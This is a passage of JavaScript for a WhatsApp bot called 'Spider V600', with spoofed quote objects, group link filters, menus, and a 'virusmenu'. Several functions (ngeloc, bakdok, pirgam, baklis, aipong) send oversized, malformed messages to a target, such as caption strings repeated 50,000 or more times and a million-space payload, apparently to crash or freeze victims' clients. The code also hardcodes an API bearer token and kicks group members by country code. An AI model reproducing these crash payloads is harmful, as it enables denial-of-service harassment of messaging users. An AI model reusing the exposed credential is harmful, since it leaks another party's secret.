"title": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
"h": `Hmm`,
'seconds': '359996400',
'gifPlayback': 'true',
'caption': `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
'jpegThumbnail': fakejpg,
}
}
}

const qinvite = {
key: {
participant: "0@s.whatsapp.net",
"remoteJid": "0@s.whatsapp.net"
},
"message": {
"groupInviteMessage": {
"groupJid": "6288213840883-1616169743@g.us",
"inviteCode": "m",
"groupName": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
"caption": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
'jpegThumbnail': fakejpg,
}
}
}

const qvideo = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"videoMessage": {
"title": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
"h": `Hmm`,
'seconds': '359996400',
'caption': `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
'jpegThumbnail': fakejpg,
'viewOnce': true
}
}
}

const qloc = {
key: {
participant: '0@s.whatsapp.net',
...(m.chat ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
locationMessage: {
name: `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
jpegThumbnail: fakejpg,
}
}
}

const qloc2 = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"liveLocationMessage": {
"title": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
"h": `Hmm`,
'jpegThumbnail': fakejpg,
}
}
}

const qcontact = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
'contactMessage': {
'displayName': `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=0\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
'jpegThumbnail': fakejpg,
thumbnail: fakejpg,
sendEphemeral: true
}
}
}
//=================================================//
//Reply
const joreply = async (teks) => {
//await sleep(500)
let thumbnails = [nulll, nulll2]
let randomIndex = Math.floor(Math.random() * thumbnails.length)
let selectedThumbnail = thumbnails[randomIndex]
return ryozingod.sendMessage(m.chat, {
contextInfo: {
mentionedJid: [m.sender],
externalAdReply: {
showAdAttribution: false,
renderLargerThumbnail: false,
title: `© SpIder V600`,
body: `Hey ${m.pushName} 👋`,
previewType: "VIDEO",
thumbnail: selectedThumbnail,
sourceUrl:`https://whatsapp.com/channel/0029VaY0Zq32P59piTo5rg0K`,
mediaUrl: `https://whatsapp.com/channel/0029VaY0Zq32P59piTo5rg0K`
}
},
text: teks
}, {
quoted: m
})
//await sleep(500)
}
//=================================================//

// Anti Link
if (AntiLink) {
if (budy.toLowerCase().includes("chat.whatsapp.com/")){
if (!isBotAdmins) return joreply(`${mess.botAdmin}, _Untuk menendang orang yang mengirim link group_`)
let gclink = (`https://chat.whatsapp.com/`+await ryozingod.groupInviteCode(m.chat))
let isLinkThisGc = new RegExp(gclink, 'i')
let isgclink = isLinkThisGc.test(m.text)
if (isgclink) return ryozingod.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\nAnda tidak akan ditendang oleh bot karena yang Anda kirim adalah link ke grup ini`})
if (isAdmins) return ryozingod.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\nAdmin sudah mengirimkan link, admin bebas memposting link apapun`})
if (isDeveloper) return ryozingod.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\Owner telah mengirim link, owner bebas memposting link apa pun`})
await ryozingod.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
ryozingod.sendMessage(m.chat, {text:`\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\n@${m.sender.split("@")[0]} Jangan kirim group link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
}
}
 // Antiwame by geekz and modified by thezetsuboxygen
if (AntiWame)
if (budy.toLowerCase().includes("wa.me")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Wa.me Link Terdeteksi 」\`\`\`\n\nAdmin sudah kirim link wa.me, admin bebas kirim link apapun`
if (isAdmins) return joreply(bvl)
if (mek.key.fromMe) return joreply(bvl)
if (isDeveloper) return joreply(bvl)
kice = m.sender
await ryozingod.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*ryozingod.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
ryozingod.sendMessage(m.chat, {text:`\`\`\`「 Wa.me Link Terdeteksi 」\`\`\`\n\n@${kice.split("@")[0]} Jangan kirim wa.me link di group ini`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
}
//antivirtex by geekz and modified by thezetsuboxygen
  if (AntiVirtex) {
  if (budy.length > 3500) {
  if (!isBotAdmins) return joreply(mess.botAdmin)
  await ryozingod.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
ryozingod.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
ryozingod.sendMessage(m.chat, {text:`\`\`\`「 Virus Terdeteksi 」\`\`\`\n\n${pushname} Telah ditendang karena mengirim virus di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
  }
  }
//anti bad words by geekz and modified by thezetsuboxygen
if (AntiToxic && !budy.includes("deletebadwords") && !budy.includes("delbadwords"))
if (badwords.some(word => budy.toLowerCase().includes(word))){
if (!isBotAdmins) return
bvl = `\`\`\`「 Kata Kasar Terdeteksi 」\`\`\`\n\nAdmin bebas menggunakan kata kasar`
if (isAdmins) return joreply(bvl)
if (mek.key.fromMe) return joreply(bvl)
if (isDeveloper) return joreply(bvl)
await ryozingod.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*ryozingod.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
ryozingod.sendMessage(m.chat, {text:`\`\`\`「 Kata Kasar Terdeteksi 」\`\`\`\n\n${pushname} Mohon tidak menggunakan kata kasar di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antiasing by geekz and modified by thezetsuboxygen
if (m.isGroup && isBotAdmins && AntiAsing) {
let member = await participants.map((x) => x.id)
for (let i = 0; i < participants.length; i++) {
if (member[i].slice(0, 2) !== "62") {
let usersId = await participants.find((u) => u.id == member[i])
if (!usersId.groupAdmins && !isDeveloper) {
} else
await ryozingod.groupParticipantsUpdate(m.chat, [member[i]], "remove")
await sleep(1000)
}
}
}
//antilink youtube video by geekz and modified by thezetsuboxygen
if (AntiLinkYoutubeVid)
if (budy.toLowerCase().includes("youtu.be")){
if (!isBotAdmins) return
bvl = `\`\`\`「 YouTube Link Terdeteksi 」\`\`\`\n\nAdmin Dan Kontributor Bot bebas kirim link apapun `
if (isAdmins) return joreply(bvl)
if (mek.key.fromMe) return joreply(bvl)
if (isDeveloper) return joreply(bvl)
await ryozingod.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*ryozingod.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
ryozingod.sendMessage(m.chat, {text:`\`\`\`「 YouTube Video Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim youtube video link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink youtube channel by geekz and modified by thezetsuboxygen
if (AntiLinkYoutubeChannel)
if (budy.toLowerCase().includes("youtube.com")){
if (!isBotAdmins) return
bvl = `\`\`\`「 YouTube Link Terdeteksi 」\`\`\`\n\nAdmin Dan Kontributor Bot bebas kirim link apapun `
if (isAdmins) return joreply(bvl)
if (mek.key.fromMe) return joreply(bvl)
if (isDeveloper) return joreply(bvl)
await ryozingod.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*ryozingod.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
ryozingod.sendMessage(m.chat, {text:`\`\`\`「 YouTube Channel Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim youtube channel link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink instagram by geekz and modified by thezetsuboxygen
if (AntiLinkInstagram)
if (budy.toLowerCase().includes("instagram.com")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Instagram Link Terdeteksi 」\`\`\`\n\nAdmin Dan Kontributor Bot bebas kirim link apapun `
if (isAdmins) return joreply(bvl)
if (mek.key.fromMe) return joreply(bvl)
if (isDeveloper) return joreply(bvl)
await ryozingod.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*ryozingod.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
ryozingod.sendMessage(m.chat, {text:`\`\`\`「 Instagram Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim instagram link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink facebook by geekz and modified by thezetsuboxygen
if (AntiLinkFacebook)
if (budy.toLowerCase().includes("facebook.com")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Facebook Link Terdeteksi 」\`\`\`\n\nAdmin Dan Kontributor Bot bebas kirim link apapun `
if (isAdmins) return joreply(bvl)
if (mek.key.fromMe) return joreply(bvl)
if (isDeveloper) return joreply(bvl)
await ryozingod.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*ryozingod.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
ryozingod.sendMessage(m.chat, {text:`\`\`\`「 Facebook Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim facebook link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink telegram by geekz and modified by thezetsuboxygen
if (AntiLinkTelegram)
if (budy.toLowerCase().includes("t.me")){
if (AntiLinkTelegram)
if (!isBotAdmins) return
bvl = `\`\`\`「 Telegram Link Terdeteksi 」\`\`\`\n\nAdmin Dan Kontributor Bot bebas kirim link apapun `
if (isAdmins) return joreply(bvl)
if (mek.key.fromMe) return joreply(bvl)
if (isDeveloper) return joreply(bvl)
await ryozingod.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*ryozingod.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
ryozingod.sendMessage(m.chat, {text:`\`\`\`「 Telegram Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim telegram link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink tiktok by geekz and modified by thezetsuboxygen
if (AntiLinkTiktok)
if (budy.toLowerCase().includes("tiktok.com")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Tiktok Link Terdeteksi 」\`\`\`\n\nAdmin Dan Kontributor Bot bebas kirim link apapun `
if (isAdmins) return joreply(bvl)
if (mek.key.fromMe) return joreply(bvl)
if (isDeveloper) return joreply(bvl)
await ryozingod.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*ryozingod.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
ryozingod.sendMessage(m.chat, {text:`\`\`\`「 Tiktok Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim tiktok link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink twitter by geekz and modified by thezetsuboxygen
if (AntiLinkTwitter)
if (budy.toLowerCase().includes("twitter.com")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Twitter Link Terdeteksi 」\`\`\`\n\nAdmin Dan Kontributor Bot bebas kirim link apapun `
if (isAdmins) return joreply(bvl)
if (mek.key.fromMe) return joreply(bvl)
if (isDeveloper) return joreply(bvl)
await ryozingod.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*ryozingod.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
ryozingod.sendMessage(m.chat, {text:`\`\`\`「 Tiktok Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim twitter link di grup ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink all by geekz and modified by thezetsuboxygen
if (AntiLinkAll)
if (budy.toLowerCase().includes("http")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Link Terdeteksi 」\`\`\`\n\nAdmin bebas kirim link apapun`
if (isAdmins) return joreply(bvl)
if (mek.key.fromMe) return joreply(bvl)
if (isDeveloper) return joreply(bvl)
await ryozingod.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*ryozingod.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
ryozingod.sendMessage(m.chat, {text:`\`\`\`「 Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}


//=================================================//
async function ssweb(url, device = 'desktop'){
return new Promise((resolve, reject) => {
const base = 'https://www.screenshotmachine.com'
const param = {
url: url,
device: device,
cacheLimit: 0
}
axios({url: base + '/capture.php',
method: 'POST',
data: new URLSearchParams(Object.entries(param)),
headers: {
'content-type': 'application/x-www-form-urlencoded; charset=UTF-8'
}
}).then((data) => {
const cookies = data.headers['set-cookie']
if (data.data.status == 'success') {
axios.get(base + '/' + data.data.link, {
headers: {
'cookie': cookies.join('')
},
responseType: 'arraybuffer'
}).then(({ data }) => {
result = {
status: 200,
result: data
}
resolve(result)
})
} else {
reject({ status: 404, statuses: `Link Error`, message: data.data })
}
}).catch(reject)
})
}

//=================================================//
async function diff(data) {
const response = await fetch(
"https://api-inference.huggingface.co/models/stablediffusionapi/lyrielv16",
{
headers: { Authorization: "Bearer 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" },
method: "POST",
body: JSON.stringify(data),
}
)
const result = await response.blob();
let arrayBuffer = await result.arrayBuffer();
const buffer = Buffer.from(arrayBuffer, 'base64')
return buffer
}

//=================================================//

//=================================================//
//=================================================//
async function ngeloc(target, kuwoted) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `✳️࿆͆᷍T̸̨̥͔͚͍͙̰̽̾̿̋͂͂ą̸̡̻̬̫͈̦͎͙̪́̾͋͋̈́̽̉̈́͘i̴̟͚͈̻̞̖͂͊̓͗͛r̵̟̣̰̜̣̤͔̺͎̘̂̈́̌͘͠á̸̧̦̜̮͖̙̲͉̯̿̔̄̅͘ͅ ̴̱̤̭͒͌́̍̌̂̾͌̌͝M̷̡̯͔͚͈̜͔͗a̶̫̩̮͕̙͓͚̠͒k̷͔̠̪̤̙̀̊̉̇͂̈́͌̄̑͠ì̷͕̱͎̳̫͊̓̒̓n̴͔̱̂ỡ̷̱͕̮̈́͆̋͊͘͜͝╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: m.chat, quoted: kuwoted })
await ryozingod.relayMessage(target, etc.message, { messageId: etc.key.id })
}
//=================================================//
async function aipong(target) {
await ryozingod.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
}
//=================================================//
async function bakdok(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "documentMessage": {
    "url": "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
    "mimetype": "penis",
    "fileSha256": "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
    "fileLength": "999999999",
    "pageCount": 999999999,
    "mediaKey": "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
    "fileName": `✳️࿆͆᷍T̸̨̥͔͚͍͙̰̽̾̿̋͂͂ą̸̡̻̬̫͈̦͎͙̪́̾͋͋̈́̽̉̈́͘i̴̟͚͈̻̞̖͂͊̓͗͛r̵̟̣̰̜̣̤͔̺͎̘̂̈́̌͘͠á̸̧̦̜̮͖̙̲͉̯̿̔̄̅͘ͅ ̴̱̤̭͒͌́̍̌̂̾͌̌͝M̷̡̯͔͚͈̜͔͗a̶̫̩̮͕̙͓͚̠͒k̷͔̠̪̤̙̀̊̉̇͂̈́͌̄̑͠ì̷͕̱͎̳̫͊̓̒̓n̴͔̱̂ỡ̷̱͕̮̈́͆̋͊͘͜͝╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`+"ྦྷ".repeat(60000),
    "fileEncSha256": "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
    "directPath": "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
    "mediaKeyTimestamp": "1715880173"
  }
}), { userJid: target, quoted: kuwoted });
await ryozingod.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
//=================================================//
async function penghitaman(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "stickerMessage": {
    "url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
    "fileSha256": "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
    "fileEncSha256": "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
    "mediaKey": "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
    "mimetype": "image/webp",
    "directPath": "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
    "fileLength": "10116",
    "mediaKeyTimestamp": "1715876003",
    "isAnimated": false,
    "stickerSentTs": "1715881084144",
    "isAvatar": false,
    "isAiSticker": false,
    "isLottie": false
  }
}), { userJid: target, quoted: kuwoted });
await ryozingod.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
//=================================================//
async function pirgam(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    interactiveMessage: {
      header: {
        title: "✳️࿆͆᷍T̸̨̥͔͚͍͙̰̽̾̿̋͂͂ą̸̡̻̬̫͈̦͎͙̪́̾͋͋̈́̽̉̈́͘i̴̟͚͈̻̞̖͂͊̓͗͛r̵̟̣̰̜̣̤͔̺͎̘̂̈́̌͘͠á̸̧̦̜̮͖̙̲͉̯̿̔̄̅͘ͅ ̴̱̤̭͒͌́̍̌̂̾͌̌͝M̷̡̯͔͚͈̜͔͗a̶̫̩̮͕̙͓͚̠͒k̷͔̠̪̤̙̀̊̉̇͂̈́͌̄̑͠ì̷͕̱͎̳̫͊̓̒̓n̴͔̱̂ỡ̷̱͕̮̈́͆̋͊͘͜͝╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮",
        hasMediaAttachment: true,
        ...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/bd058592ea94a4bb50a7a.jpg" } }, { upload: ryozingod.waUploadToServer }))
      },
      body: {
        text: ""
      },
      footer: {
        text: "›          Taira Makino"
      },
      nativeFlowMessage: {
        messageParamsJson: " ".repeat(1000000)
      }
    }
}), { userJid: target, quoted: kuwoted });
await ryozingod.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
//=================================================//
async function baklis(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  'listMessage': {
    'title': "𝕾𝖕𝖎𝖉𝖊𝖗➯𝖂𝖊𝖇➊"+" ".repeat(920000),
        'footerText': `✳️࿆͆᷍T̸̨̥͔͚͍͙̰̽̾̿̋͂͂ą̸̡̻̬̫͈̦͎͙̪́̾͋͋̈́̽̉̈́͘i̴̟͚͈̻̞̖͂͊̓͗͛r̵̟̣̰̜̣̤͔̺͎̘̂̈́̌͘͠á̸̧̦̜̮͖̙̲͉̯̿̔̄̅͘ͅ ̴̱̤̭͒͌́̍̌̂̾͌̌͝M̷̡̯͔͚͈̜͔͗a̶̫̩̮͕̙͓͚̠͒k̷͔̠̪̤̙̀̊̉̇͂̈́͌̄̑͠ì̷͕̱͎̳̫͊̓̒̓n̴͔̱̂ỡ̷̱͕̮̈́͆̋͊͘͜͝╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`,
        'description': `✳️࿆͆᷍T̸̨̥͔͚͍͙̰̽̾̿̋͂͂ą̸̡̻̬̫͈̦͎͙̪́̾͋͋̈́̽̉̈́͘i̴̟͚͈̻̞̖͂͊̓͗͛r̵̟̣̰̜̣̤͔̺͎̘̂̈́̌͘͠á̸̧̦̜̮͖̙̲͉̯̿̔̄̅͘ͅ ̴̱̤̭͒͌́̍̌̂̾͌̌͝M̷̡̯͔͚͈̜͔͗a̶̫̩̮͕̙͓͚̠͒k̷͔̠̪̤̙̀̊̉̇͂̈́͌̄̑͠ì̷͕̱͎̳̫͊̓̒̓n̴͔̱̂ỡ̷̱͕̮̈́͆̋͊͘͜͝╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`,
        'buttonText': null,
        'listType': 2,
        'productListInfo': {
          'productSections': [{
            'title': 'anjay',
            'products': [
              { "productId": "4392524570816732" }
            ]
          }],
          'productListHeaderImage': {
            'productId': '4392524570816732',
            'jpegThumbnail': null
          },
          'businessOwnerJid': '0@s.whatsapp.net'
        }
      },
      'footer': 'puki',
      'contextInfo': {
        'expiration': 604800,
        'ephemeralSettingTimestamp': "1679959486",
        'entryPointConversionSource': "global_search_new_chat",
        'entryPointConversionApp': "whatsapp",
        'entryPointConversionDelaySeconds': 9,
        'disappearingMode': {
          'initiator': "INITIATED_BY_ME"
        }
      },
      'selectListType': 2,
      'product_header_info': {
        'product_header_info_id': 292928282928,
        'product_header_is_rejected': false
      }
    }), { userJid: target, quoted: ryobug });
await ryozingod.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
//=================================================//
/*if (m.message) {
console.log(chalk.black(chalk.bgWhite('[ PESAN ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> Dari'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> Di'), chalk.green(m.isGroup ? pushname : 'Private Chat', m.chat))
}
*/

if (!isGroup && !isDeveloper && db.data.settings[botNumber].onlygrub ) {
	if (command){
return joreply(` Halo ${m.pushName}! Karena Kami Ingin Mengurangi Spam, Silakan Gunakan Bot di Grup Chat !`)
}
}

//=================================================//

if (m.message) {
  if (isCmd && !m.isGroup) {
    console.log(chalk.black(chalk.bgHex('#ff5e78').bold(`\n🌟 ${ucapanWaktu} 🌟`)));
    console.log(chalk.white(chalk.bgHex('#4a69bd').bold(`🚀 Ada Pesan, Om! 🚀`)));
    console.log(chalk.black(chalk.bgHex('#fdcb6e')(`📅 DATE: ${new Date().toLocaleString()}
💬 MESSAGE: ${m.body || m.mtype}
🗣️ SENDERNAME: ${pushname}
👤 JIDS: ${m.sender}`)));
  } else if (m.isGroup) {
    console.log(chalk.black(chalk.bgHex('#ff5e78').bold(`\n🌟 ${ucapanWaktu} 🌟`)));
    console.log(chalk.white(chalk.bgHex('#4a69bd').bold(`🚀 Ada Pesan, Om! 🚀`)));
    console.log(chalk.black(chalk.bgHex('#fdcb6e')(`📅 DATE: ${new Date().toLocaleString()}
💬 MESSAGE: ${m.body || m.mtype}
🗣️ SENDERNAME: ${pushname}
👤 JIDS: ${m.sender}
🔍 MESS LOCATION: ${groupName}`)));
  }
}

//=================================================//
switch (command) {
// Status
case 'public': {
if (!isPremium) return joreply(mess.premium) 
ryozingod.public = true
joreply('succes')
}
break
//=================================================//
case 'clearchat': {
pee = "\n".repeat(200)
joreply(pee + '😁🖕')
}
break
//=================================================//
//Menu
case "menu": case "help": {
let jinjing = [nulll, nulll2]
let randomIndex = Math.floor(Math.random() * jinjing.length)
let mydick = jinjing[randomIndex]

//text menu
let penisbengkok = `
*USER : @${m.sender.split("@")[0]}*

     𝐒𝐏𝐈𝐃𝐄𝐑 V600
   
    
◈ Creator : Taira Makino
◈ Library : WS-Baileys
◈ Type : Case
◈ Status : Ready
◈ Mode : ${ryozingod.public ? '✱ Public ༣' : '✲ Self ༣'}
◈ User : ${Object.keys(db.data.users).length}
◈ Prefix : Multi
`

let njing = `
*USER : @${m.sender.split("@")[0]}*

     𝐒𝐏𝐈𝐃𝐄𝐑 V600
 

◈ Creator : Taira Makino
◈ Library : WS-Baileys
◈ Type : Case
◈ Status : Ready
◈ Mode : ${ryozingod.public ? '✱ Public ༣' : '✲ Self ༣'}
◈ User : ${Object.keys(db.data.users).length}
◈ Prefix : Multi


⚠️${prefix}virusmenu
⚠️${prefix}allmenu
⚠️${prefix}changemenu button/non
⚠️${prefix}owner


> Taira Makino
`
//Button Menu
let freesex = {
viewOnceMessage: {
message: {
interactiveMessage: {
"contextInfo": {
"mentionedJid": [m.sender],
"isForwarded": true,
"forwardedNewsletterMessageInfo": {
"newsletterJid": '0@newsletter',
"newsletterName": 'By Spider Execution Vault',
"serverMessageId": 1
},
},
"header": {
"title": penisbengkok,
...(await prepareWAMessageMedia({ image : mengkece }, { upload: ryozingod.waUploadToServer })),
"hasMediaAttachment": true
},
"body": {
"text": ""
},
"footer": {
"text": "⿻   Suck_My_Dick   ⿻"
},
"nativeFlowMessage": {
"buttons": [
{
"name": "single_select",
"buttonParamsJson": `{ "title": "⿻ᴛᴀɪʀᴀ ᴍᴀᴋɪɴᴏ⿻", "sections": [{ "title": "# !-Choose One Of Them", "highlight_label": "🌏General Commands🗨️", "rows": [{ "header": "ALL COMMAND", "title": "Show All Command", "id": ".allmenu" }, { "header": "Owner", "title": "Displays Owner Number", "id": ".owner" }, { "header": "Bot Info", "title": "Displays Information About Bots", "id": ".botstatus" }] }, { "title": "🦠 SpeCiaL - ComManD ❌", "highlight_label": " #SpeCial ", "rows": [{ "header": "bugl - Menu", "title": "displays all special commands", "id": ".virusmenu" }] }] }`
},
{
"name": "cta_url",
"buttonParamsJson": "{\"display_text\":\"𝐖𝐡𝐚𝐭𝐬𝐚𝐩𝐩 𝐂𝐡𝐚𝐧𝐧𝐞𝐥\",\"url\":\"https://whatsapp.com/channel/0029VaY0Zq32P59piTo5rg0K\",\"merchant_url\":\"https://whatsapp.com/channel/0029VaY0Zq32P59piTo5rg0K\"}"
}
],
"messageParamsJson": ""
}
}
}
}
};

let kontollurus = {
image: mengkece,
caption: njing,
contextInfo:{externalAdReply:{
title: '𝕾𝖕𝖎𝖉𝖊𝖗➯𝖂𝖊𝖇➊',
body: `Hie : ${m.pushName} `, 
showAdAttribution: true,
thumbnail: mydick,
mediaType: 4,
MediaUrl:`https://whatsapp.com/channel/0029VaY0Zq32P59piTo5rg0K`,
sourceUrl:`https://whatsapp.com/channel/0029VaY0Zq32P59piTo5rg0K`,
}}
};

if ( db.data.settings[botNumber].menuType === 'externalImage') {
ryozingod.sendMessage(m.chat, kontollurus, { quoted: m })
} else if ( db.data.settings[botNumber].menuType === 'buttonImage') {
ryozingod.relayMessage(m.chat, freesex, {})
}

}
break
//=================================================//
case "allmenu": case "allcmd": {
let jinjing = [nulll, nulll2]
let randomIndex = Math.floor(Math.random() * jinjing.length)
let mydick = jinjing[randomIndex]
let itsmenu = `

   \`Spider V600\`

◈ Creator : Taira Makino
◈ Library : WS-Baileys
◈ Type : Case
◈ Status : Ready
